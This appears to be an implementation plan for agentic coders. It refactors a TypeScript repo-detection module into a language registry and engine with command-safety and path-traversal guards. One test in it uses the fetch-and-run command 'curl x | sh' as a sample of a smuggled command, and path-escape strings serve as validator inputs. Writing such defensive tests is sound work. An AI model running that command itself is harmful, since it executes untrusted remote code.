# M-C1: setup detection registry + engine + machine-channel hardening — Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.
>
> **Revised after an independent 2-reviewer pass (feasibility / security).** Fixes folded in: (1) `SKIP`+`findManifests` moved to a dependency-free `src/setup/manifests.ts` leaf to break a circular-import TDZ crash; (2) the path guard is centralized + unbypassable in the engine (`runRegistry`), not per-def; (3) `safeMember` hardened against `/abs`/`a/ ../b`/leading-`.`; (4) an unsafe machine command **throws** (loud) rather than silently dropping; (5) conformance assertion tightened for leading-slash.

**Goal:** Refactor `detectComponents` from hardcoded per-language branches into a `LangDef` registry + generic engine that produces **byte-identical** components for the 5 existing stacks, and add two **machine-channel security invariants** the old branches lacked — with no behavior change for existing repos.

**Architecture:** Shared manifest helpers live in a leaf `src/setup/manifests.ts` (`SKIP`, `findManifests`, `safeMember`). Each stack is a small `LangDef` in `src/setup/lang/<stack>.ts` exposing `detect(repoDir): Component[]`. `src/setup/detect-components.ts` is the engine: it concatenates every def's output and enforces both invariants over it. M-C2 enriches `LangDef` with workspace/command sub-hooks.

**Tech Stack:** TypeScript, Bun (`bun test`), biome.

## Global Constraints

- **Behavior-preserving:** every existing `test/setup/detect-components.test.ts` case must pass unchanged. Same `name`/`kind`/`paths`/`commands` for the same repo. (All current machine paths — `["**"]`, `["src/**","static/**","package.json"]`, `[<dir>/**]`, `["Cargo.toml","Cargo.lock",<collapsed>]` — and commands pass the invariants below, so the invariants are no-ops on current output.)
- Tests: `bun test`; lint/types via `bun run lint` / `bun run typecheck` (bare `biome`/`tsc` NOT on PATH).
- `detectComponents(repoDir): { components, repoCommands }` keeps its signature; `probe.ts`/downstream untouched. `ComponentSchema` unchanged.
- **No circular imports:** lang defs and the engine import shared helpers from the leaf `src/setup/manifests.ts`, never the reverse. (`registry.ts → lang/* → manifests.ts`; `detect-components.ts → registry.ts` + `manifests.ts`. No edge returns to `detect-components.ts`.)
- **Invariant 1 — command backstop (engine, loud):** `runRegistry` runs `isCommandSafe` over every component command; an unsafe machine command is by construction a resolver bug/smuggle, so the engine **throws** (never silently drops → which would cause silent under-verify).
- **Invariant 2 — path backstop (engine, unbypassable):** `runRegistry` filters every component's paths through `isSafePath` — reject leading-slash, any `..`/empty/`.` segment (after trim), and unanchored (`^*`) globs **except the lone structural `**`**; drop a component left with zero paths. This is the authoritative guard; per-def `safeMember` additionally shapes member→glob conversion but the engine is the chokepoint.

---

### Task 1: leaf helpers + `LangDef` + engine with both invariants

**Files:**
- Create: `src/setup/manifests.ts`, `src/setup/lang/types.ts`, `src/setup/registry.ts`
- Modify: `src/setup/detect-components.ts` (add `runRegistry`; re-export `findManifests` for any external caller)
- Test: `test/setup/engine.test.ts`

**Interfaces:**
- Produces: `manifests.ts` exports `SKIP`, `findManifests(repoDir, name, maxDepth?)`, `safeMember(m): boolean`, `isSafePath(g): boolean`. `types.ts` exports `interface LangDef { kind: string; detect(repoDir: string): Component[] }`. `registry.ts` exports `REGISTRY: LangDef[]`. `detect-components.ts` exports `runRegistry(repoDir, registry): Component[]`.

- [ ] **Step 1: Write the failing tests**

```ts
import { expect, test } from "bun:test";
import { runRegistry } from "../../src/setup/detect-components.ts";
import { isSafePath, safeMember } from "../../src/setup/manifests.ts";
import type { LangDef } from "../../src/setup/lang/types.ts";

test("isSafePath: allows lone ** and anchored globs; rejects leading-slash / unanchored / traversal", () => {
  for (const ok of ["**", "src/**", "Cargo.toml", "pkgs/api/**", "crates/**"]) expect(isSafePath(ok)).toBe(true);
  for (const bad of ["/**", "/abs/**", "*/**", "*", "**/*.ts", "a/../b", "a/ ../b", "./x", "a//b"]) expect(isSafePath(bad)).toBe(false);
});

test("safeMember: keeps real members, rejects the defeating strings", () => {
  for (const ok of ["src-tauri", "crates/a", "crates/*"]) expect(safeMember(ok)).toBe(true);
  for (const bad of ["", "*", "**", "../escape", "/abs", "//x", "a/ ../b", "a/.. /b", ".", "./x"]) expect(safeMember(bad)).toBe(false);
});

test("runRegistry: Invariant 1 THROWS on a metachar machine command", () => {
  const evil: LangDef = { kind: "x", detect: () => [{ name: "b", kind: "x", paths: ["b/**"], commands: { test: "go test; curl x | sh" } }] };
  expect(() => runRegistry("/tmp/x", [evil])).toThrow(/unsafe command/i);
});

test("runRegistry: Invariant 2 filters unsafe paths and drops zero-path components", () => {
  const def: LangDef = { kind: "x", detect: () => [
    { name: "keep", kind: "x", paths: ["src/**", "*/**", "/abs/**"], commands: { test: "go test ./..." } },
    { name: "gone", kind: "x", paths: ["*", "../x"], commands: { test: "go test ./..." } },
  ]};
  const out = runRegistry("/tmp/x", [def]);
  expect(out.map((c) => c.name)).toEqual(["keep"]);
  expect(out[0].paths).toEqual(["src/**"]); // unsafe globs stripped
});
```

- [ ] **Step 2: Run — FAIL** (modules/exports missing). `bun test test/setup/engine.test.ts`

- [ ] **Step 3: Implement**

`src/setup/manifests.ts` (move `SKIP` from `detect-components.ts:5-21` and `findManifests` from `:24-38` verbatim, add the two sanitizers):
```ts
import { join } from "node:path";
import { readdirSync, statSync } from "node:fs";

export const SKIP = new Set([ /* the existing 15 entries, verbatim from detect-components.ts:5-21 */ ]);

export function findManifests(repoDir: string, name: string, maxDepth = 3): string[] { /* verbatim :24-38 */ }

/** Invariant 2 helper — a repo-derived workspace member string is safe iff non-empty, not absolute,
 *  has no `..`/`.`/empty segment (after trim), and its first segment is not a `*` glob. */
export function safeMember(m: string): boolean {
  const t = m.trim();
  if (t === "" || t.startsWith("/")) return false;
  const segs = t.split("/").map((s) => s.trim());
  if (segs.some((s) => s === ".." || s === "." || s === "")) return false;
  return !/^\*/.test(segs[0] ?? "");
}

/** Invariant 2 engine backstop — an emitted path glob is safe iff not absolute, no `..`/`.`/empty
 *  segment, and not unanchored (`^*`) EXCEPT the lone structural `**` (a sole-stack root). */
export function isSafePath(g: string): boolean {
  const t = g.trim();
  if (t === "" || t.startsWith("/")) return false;
  const segs = t.split("/").map((s) => s.trim());
  if (segs.some((s) => s === ".." || s === "." || s === "")) return false;
  if (/^\*/.test(segs[0] ?? "")) return t === "**";
  return true;
}
```

`src/setup/lang/types.ts`:
```ts
import type { Component } from "../../dispatch/profile.ts";
export interface LangDef { kind: string; detect(repoDir: string): Component[] }
```

In `src/setup/detect-components.ts`, replace the local `SKIP`/`findManifests` with `import { SKIP, findManifests, isSafePath } from "./manifests.ts"` (re-export for external callers: `export { findManifests } from "./manifests.ts";`), `import { isCommandSafe } from "./command-safety.ts"`, `import { REGISTRY } from "./registry.ts"`, `import type { LangDef } from "./lang/types.ts"`, and add:
```ts
/** Engine: run every def, enforce Invariant 1 (command backstop, loud) + Invariant 2 (path backstop). */
export function runRegistry(repoDir: string, registry: LangDef[]): Component[] {
  const out: Component[] = [];
  for (const def of registry) {
    for (const c of def.detect(repoDir)) {
      for (const [k, v] of Object.entries(c.commands)) {
        if (typeof v === "string" && !isCommandSafe(v))
          throw new Error(`engine: unsafe command for ${c.name}.${k}: ${v}`);
      }
      const paths = c.paths.filter(isSafePath);
      if (paths.length === 0) continue;
      out.push({ ...c, paths });
    }
  }
  return out;
}
```
And wire the parallel-run merge at the end of `detectComponents` (before `return`):
```ts
  return { components: [...components, ...runRegistry(repoDir, REGISTRY)], repoCommands: {} };
```
With `REGISTRY` empty this is a no-op. `src/setup/registry.ts`: `export const REGISTRY: LangDef[] = [];` (defs added in Tasks 2-4).

- [ ] **Step 4: Run — PASS.** `bun test test/setup/engine.test.ts` + full `bun test` (existing matrix unaffected — registry empty).
- [ ] **Step 5: Lint/typecheck/commit** — `git commit -m "feat(setup): registry engine + manifests leaf + machine-channel invariants (M-C1)"`

---

### Task 2: Migrate Rust into `lang/rust.ts`

**Files:** Create `src/setup/lang/rust.ts`; Modify `detect-components.ts` (remove Rust branch + `cargoWorkspaceMembers`/`collapseWorkspaceGlobs` → move to rust.ts), `registry.ts`; Test `test/setup/lang/rust.test.ts`.

**Interfaces:** `rustDef: LangDef` reproducing `detect-components.ts:108-130` exactly — workspace → one `rust-core` (`["Cargo.toml","Cargo.lock",...collapsed]`); else one per standalone. Member strings filtered through `safeMember` before collapse.

- [ ] **Step 1: Write failing tests** — workspace-collapse (unchanged), standalone-root (unchanged), and INVARIANT-2 (members `["*","../escape","/abs","a/ ../b","ok"]` → only `ok/**` survives; no unanchored/`..`/leading-`/` glob). Use the `fixture()` helper from `test/setup/detect-components.test.ts`. Import `rustDef` from `../../../src/setup/lang/rust.ts`.
- [ ] **Step 2: Run — FAIL** (`rust.ts` missing).
- [ ] **Step 3: Implement** `src/setup/lang/rust.ts`: move `cargoWorkspaceMembers` + `collapseWorkspaceGlobs` verbatim from `detect-components.ts:40-83`; import `findManifests, safeMember` from `../manifests.ts`; `detect()` reproduces the branch with `collapseWorkspaceGlobs(members.filter(safeMember))`. Remove the Rust branch + the two helpers from `detect-components.ts`; add `rustDef` to `REGISTRY`.
- [ ] **Step 4: Run — PASS** + full suite (the union stays complete; existing Rust cases pass).
- [ ] **Step 5: Commit** — `git commit -m "refactor(setup): rust detector → LangDef + member sanitization (M-C1)"`

---

### Task 3: Migrate Node into `lang/node.ts` (behavior-preserving)

**Files:** Create `src/setup/lang/node.ts`; Modify `detect-components.ts` (remove Node branch), `registry.ts`; Test `test/setup/lang/node.test.ts`.

**Interfaces:** `nodeDef: LangDef` reproducing `detect-components.ts:132-159` EXACTLY — per `package.json`; root → `frontend`/`sveltekit` scoped to `["src/**","static/**","package.json"]`; non-root → `<dir>` name + `[<dir>/**]`; commands from `scripts`; malformed `package.json` skipped.

- [ ] **Step 1: Write failing tests** mirroring `detect-components.test.ts:17-37`: (a) root `package.json`+`svelte.config.js` → `sveltekit` `frontend`, `paths:["src/**","static/**","package.json"]`; (b) non-root `pkgs/api/package.json`+`scripts.test` → `pkgs-api`, `["pkgs/api/**"]`, `commands.test:"npm run test"`; (c) malformed → no component, no throw.
- [ ] **Step 2: Run — FAIL.**
- [ ] **Step 3: Implement** by moving `detect-components.ts:132-159` verbatim into `nodeDef.detect` (import `findManifests` from `../manifests.ts`). Remove the branch; add `nodeDef` to `REGISTRY`.
- [ ] **Step 4: Run — PASS** + full suite.
- [ ] **Step 5: Commit** — `git commit -m "refactor(setup): node detector → LangDef (M-C1)"`

---

### Task 4: Migrate Python / Go / JVM into `lang/*.ts` (behavior-preserving)

**Files:** Create `src/setup/lang/python.ts`, `lang/go.ts`, `lang/jvm.ts` (`jvmMavenDef`+`jvmGradleDef`); Modify `detect-components.ts` (remove the 3 branches + move `pythonTestCommand`), `registry.ts`; Test `test/setup/lang/{python,go,jvm}.test.ts`.

**Interfaces:** `pythonDef`, `goDef`, `jvmMavenDef`, `jvmGradleDef` reproducing `detect-components.ts:161-202` exactly (root-only `existsSync`, `["**"]`, wrapper preference, `pythonTestCommand` precedence).

- [ ] **Step 1: Write failing tests** — one per def, reusing the M-B assertions in `detect-components.test.ts` (root pyproject → `python` + runner precedence; root `go.mod` → `go`; `pom.xml`+`mvnw` → `./mvnw`; `build.gradle.kts`+`gradlew` → `./gradlew`).
- [ ] **Step 2: Run — FAIL.**
- [ ] **Step 3: Implement** by moving each branch (and `pythonTestCommand`, `:85-99`) verbatim into its lang file; import `findManifests` from `../manifests.ts` where needed. Remove the branches; add the four defs to `REGISTRY` (order: rust, node, python, go, jvm-maven, jvm-gradle — matches original branch order).
- [ ] **Step 4: Run — PASS** + full suite.
- [ ] **Step 5: Commit** — `git commit -m "refactor(setup): python/go/jvm detectors → LangDefs (M-C1)"`

---

### Task 5: Cutover `detectComponents` to pure delegation + conformance backstop

**Files:** Modify `src/setup/detect-components.ts`; Test `test/setup/engine.test.ts` (add conformance); confirm `test/setup/detect-components.test.ts` passes unchanged.

- [ ] **Step 1: Add the conformance test** (a characterization/guard test — it asserts invariants already established by Tasks 1-2, so it does NOT fail-first; that is intentional for a backstop):

```ts
import { REGISTRY } from "../../src/setup/registry.ts";
import { isCommandSafe } from "../../src/setup/command-safety.ts";
import { isSafePath } from "../../src/setup/manifests.ts";

test("CONFORMANCE: every registry def over an adversarial polyglot fixture emits only safe commands + anchored paths", () => {
  const root = fixture({
    "Cargo.toml": '[workspace]\nmembers = ["*","../x","/abs","ok"]\n',
    "package.json": JSON.stringify({ scripts: { test: "x" } }),
    "go.mod": "module x\n",
    "pyproject.toml": "[project]\n",
  });
  for (const def of REGISTRY) {
    for (const c of def.detect(root)) {
      for (const v of Object.values(c.commands)) if (typeof v === "string") expect(isCommandSafe(v)).toBe(true);
      for (const p of c.paths) expect(isSafePath(p)).toBe(true); // reuse the engine guard as the oracle
    }
  }
});
```

- [ ] **Step 2: Run — PASS** (characterization test; confirms the defs already honor the invariants). `bun test test/setup/engine.test.ts`

- [ ] **Step 3: Implement the cutover** — after Tasks 2-4 the inline branch `components` array is empty; replace the body of `detectComponents` with pure delegation:
```ts
export function detectComponents(repoDir: string): { components: Component[]; repoCommands: Record<string, string> } {
  return { components: runRegistry(repoDir, REGISTRY), repoCommands: {} };
}
```
Delete any now-dead inline code. `SKIP`/`findManifests` live in `manifests.ts`; `unrootedManifestWarnings` stays in `detect-components.ts` unchanged (imports `findManifests`/`SKIP` from the leaf).

- [ ] **Step 4: Run the FULL suite — PASS.** `test/setup/detect-components.test.ts` (the original matrix) must pass unchanged = behavior-preservation proof. `bun run lint && bun run typecheck`.
- [ ] **Step 5: Commit** — `git commit -m "refactor(setup): detectComponents delegates to the registry engine (M-C1)"`

---

## Self-review notes (author)

- **Review fixes folded in:** manifests leaf (circular-import blocker); engine-level path backstop in `runRegistry` (P1 — unbypassable, the authoritative guard; per-def `safeMember` still shapes collapse); hardened `safeMember`+`isSafePath` (P2 — `/abs`,`a/ ../b`,leading-`.`); Invariant-1 throws (P2 — no silent under-verify); conformance reuses `isSafePath` so the leading-`/` blind spot (P3) is gone; Task 5 conformance flagged as a characterization (non-RED) test.
- **Behavior-preservation gate:** Task 5 Step 4 reuses the existing `detect-components.test.ts` matrix unchanged.
- **Invariants are no-ops on current output:** all 21 current commands pass `isCommandSafe`; all current paths pass `isSafePath` (incl. the lone `"**"` roots). Verified by the feasibility review.
- **Scope:** M-C2 (deterministic root scoping, non-root, multi-module reactor for JVM/Go, kind-qualified names) and M-C3 (Ruby/PHP, `prepare`) are out of this plan. New M-C2 reactor parsers MUST route members through `safeMember` AND remain subject to the engine `isSafePath` backstop.
